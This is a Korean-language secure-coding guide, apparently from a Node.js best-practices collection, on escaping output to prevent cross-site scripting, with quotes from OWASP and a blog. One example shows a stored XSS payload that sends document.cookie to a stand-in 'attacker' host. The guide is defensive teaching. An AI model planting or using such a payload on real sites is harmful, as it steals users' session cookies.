# 출력을 이스케이프하라

### 한 문단 설명

HTML과 여타 웹 언어들은 내용을 실행가능 코드와 혼합한다 - 단일 HTML 문단은 자바스크립트 실행 지시를 따라 데이터의 시각적 표현을 포함하고 있을 것이다.
HTML을 랜더링 하거나 API로 부터 데이터를 반환하는 경우에 우리는 순수 content가 브라우저에서 해석되고 실행되는 자바스크립트 코드를 포함할 것으로 믿는다. 이러한 것은 예를들어 해커가 데이터베이스에 심어둔 content - 예, `<div><script>//malicious code</script></div>`를 랜더링할 때 발생한다. 브라우저에게 신뢰할 수 없는 데이터 청크를 절대 해석하지 말라고 지시함으로써 이 문제를 완화할 수 있다 - 이 기술을 이스케이핑이라 부른다. 많은 npm 라이브러리들과 HTML 템플릿이 이스케이핑 기능을 제공한다. (예: [escape-html](https://github.com/component/escape-html), [node-esapi](https://github.com/ESAPI/node-esapi)). HTML 뿐 아니라 CSS와 자바스크립트 content 또한 이스케이프 되어야한다.

### 코드 예시 - 너의 HTML에 신뢰할 수 없는 데이터를 넣지 마라.

```javascript
<script>...신뢰할 수 없는 데이터를 절대 여기 올리지 마라...</script>   directly in a script

 <!--...신뢰할 수 없는 데이터를 절대 여기 올리지 마라...-->             inside an HTML comment

 <div ...신뢰할 수 없는 데이터를 절대 여기 올리지 마라...=test />       in an attribute name

 <신뢰할 수 없는 데이터를 절대 여기 올리지 마라... href="/test" />   in a tag name

 <style>...신뢰할 수 없는 데이터를 절대 여기 올리지 마라...</style>   directly in CSS

```

### 코드 예시 - DB에 심어질 수 있는 악성 content

```javascript
<div>
  <b>포스트의 임시 내용</b>
  <script>window.location='http://attacker/?cookie='+document.cookie</script>
</div>
```

<br/><br/>

### 블로그 인용: "문자가 해석되기 원치 않을 때"

다음의 블로그로 부터 [benramsey.com](https://benramsey.com/articles/escape-output/)

> 데이터는 너의 애플리케이션이 HTML, SQL, XML, WML의 폼으로 각 웹브라우저, 데이터베이스, RSS 리더, 무선기기 등으로 전송되게 할 것이다. 가능성은 무궁무진하다.
> 각각의 폼은 여타 일반적인 글자와는 다르게 해석되는 그들만의 문자셋을 가지고 있다. 때에 따라 문자셋을 전송하여 해석되길 원할 수도 원치 않을 수도(유저 혹은 몇 다른 자원으로 부터 입력이 들어오는 경우) 있기에 우리는 이 문자셋을 이스케이프해야한다.

> 이스케이핑은 또한 종종 인코딩이라고도 불리운다. 이것은 간단히 말해, 장차 해석되거나 실행되지 않는 형태로 데이터를 표현하는 처리과정을 말한다. 에를들어, HTML은 <strong> 태그가 특별한 의미를 가지고 있기 떄문에 웹브라우저에서 아래와 같은 문장을 볼드체로 렌더링할 것이다:
> <strong>This is bold text.</strong>
> 그러나 브라우저에서 태그를 랜더링하더라도 그들이 해석됨을 원치 않음을 가정해 보아라. 그땐, HTML에서 특수한 의미를 지니는 괄호 앵글을 이스케이프 해야한다. 다음은 이스케이프된 HTML을 보여준다:

&lt;strong&gt;This is bold text.&lt;/strong&gt;

<br/><br/>

### 블로그 인용: OWASP는 보안-중심 인코딩 라이브러리의 사용을 권장한다.

OWASP의 블로그로 부터 [XSS (Cross Site Scripting) Prevention Cheat Sheet](<https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet>)

> (중략)"이러한 인코더들을 작성함은 그렇게 어렵진않다. 그러나 꽤 많은 함정이 존재한다. 자바스크립트에서 \와 같은 이스케이핑 숏컷을 사용하고자 하는 유혹을 느끼는 것이 그 예이다." 하지만, 이러한 value들은 위험하고 브라우저의 nested-parer에 의해 잘못해석될 여지가 있다. 또한 안전해지려는 너의 노력을 무효화 하는 데 사용할 수 있는 이스케이프 문자를 이스케이프 하는 것을 까먹을 수 있다. **OWASP는 이러한 규칙들이 올바르게 수행되게 하도록 보안-중심 인코딩 라이브러리를 사용할 것을 권장한다**."

<br/><br/>

### 블로그 인용: "HTML의 일부분에는 반드시 이스케이프 구문을 사용하여야 한다."

OWASP의 블로그로 부터 [XSS (Cross Site Scripting) Prevention Cheat Sheet](<https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet>)

> "그러나 너가 신뢰할 수 없는 데이터를 <script>태그 안 어느곳, 혹은 onmouseover와 같은 이벤트 핸들러 어트리뷰트, 혹은 CSS 또는 URL에 집어넣는다면 HTML 엔티티 인코딩은 작동하지 않을 것이다. 따라서 너가 HTML 엔티티 인코딩을 모든 곳에 삽입하더라도 XSS로 부터 자유롭지 못하다. 너는 신뢰할 수 없는 데이터를 넣는 HTML 도큐먼트 부분에 반드시 이스케이프 구문을 사용하여야 한다.
